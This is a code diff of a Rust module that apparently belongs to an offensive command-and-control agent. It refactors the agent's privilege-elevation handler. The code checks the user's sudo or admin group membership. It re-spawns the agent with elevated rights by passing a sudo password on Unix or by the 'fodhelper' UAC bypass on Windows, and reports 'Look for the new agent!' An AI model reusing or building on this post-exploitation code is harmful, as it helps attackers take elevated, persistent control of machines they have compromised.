@@ -2,6 +2,7 @@ use std::error::Error;
 use sysinfo::{System, SystemExt, UserExt};
 use whoami::username;
 use crate::config::ConfigOptions;
+use crate::cmd::{CommandArgs, notion_out};
 use std::env::args;
 use std::process::Command;
 #[cfg(windows)] use std::env::{var};
@@ -16,6 +17,8 @@ use std::process::Command;
 /// 
 /// Ain't perfect, but it's a start.
 pub fn can_elevate() -> bool {
+    // Get username and match it against list of users that has data
+    // Uses group membership to determine elevation capabilities
     let s = System::new_all();
     let username = username();
     let user = s.users()
@@ -23,12 +26,13 @@ pub fn can_elevate() -> bool {
         .filter(|&u| u.name() == username )
         .nth(0)
         .unwrap();
-    #[cfg(not(windows))] {
-        // Get username and match it against list of users that has data
-        // Uses group membership to determine elevation capabilities
+
+    #[cfg(target_os = "linux")] {
         return user.groups().contains(&"sudo".to_string());
     }
-
+    #[cfg(target_os = "macos")] {
+        return user.groups().contains(&"admin".to_string());
+    }
     #[cfg(windows)] {
         user.groups()
             .into_iter()
@@ -45,16 +49,15 @@ pub fn can_elevate() -> bool {
 /// 
 /// Because we can't wait for the output of the child process, 
 /// we toss the handle.
-pub async fn handle(s: &String, config_options: &mut ConfigOptions) -> Result<String, Box<dyn Error>> {
+pub async fn handle(cmd_args: &mut CommandArgs, config_options: &mut ConfigOptions) -> Result<String, Box<dyn Error>> {
     if can_elevate() {
-        let mut elevate_args = s.split(" ");
         #[cfg(not(windows))] {
-            match elevate_args.nth(0).unwrap().trim() {
+            match cmd_args.nth(0).unwrap().as_str() {
                 "sudo" => {
-                    let pwd = elevate_args.nth(0).unwrap();
+                    let pwd = cmd_args.nth(0).unwrap();
                     // Check for empty pw
                     if pwd.is_empty() {
-                        return Ok("Need a sudo password!".to_string());
+                        return notion_out!("Need a sudo password!");
                     }
                     let encoded_config = config_options.to_base64();
                     let agent_path = args().nth(0).unwrap();
@@ -63,14 +66,14 @@ pub async fn handle(s: &String, config_options: &mut ConfigOptions) -> Result<St
                     .arg("-c")
                     .arg(cmd_string)
                     .spawn()?;
-                    Ok("Elevation attempted. Look for the new agent!".to_string())
+                    notion_out!("Elevation attempted. Look for the new agent!")
             }
-                _ => Ok("Unknown elevation method".to_string())
+                _ => notion_out!("Unknown elevation method")
             }
         }
 
         #[cfg(windows)] {
-            match elevate_args.nth(0).unwrap().trim() {
+            match cmd_args.nth(0).unwrap().as_str() {
                 "fodhelper" => {
                     if let Ok(v) = var("APPDATA") {
                         let mut persist_path: String = v;
@@ -104,24 +107,24 @@ pub async fn handle(s: &String, config_options: &mut ConfigOptions) -> Result<St
                                     std::time::Duration::from_secs(1);
                                     std::thread::sleep(sleep_time);
                                 }
-                                Ok("Elevation attempted. Look for the new agent!".to_string())
+                                notion_out!("Elevation attempted. Look for the new agent!")
                             },
                             Err(e) => { return Ok(e.to_string())}
                         }  
                     } else {
-                        Ok("Couldn't get APPDATA location".to_string())
+                        notion_out!("Couldn't get APPDATA location")
                     }
 
                     
 
                 }
                 _ => {
-                    Ok("Elevation unavailable".to_string())
+                    notion_out!("Elevation unavailable")
                 }
             }
         }
 
     } else {
-        Ok("Elevation unavailable".to_string())
+        notion_out!("Elevation unavailable")
     }
 }
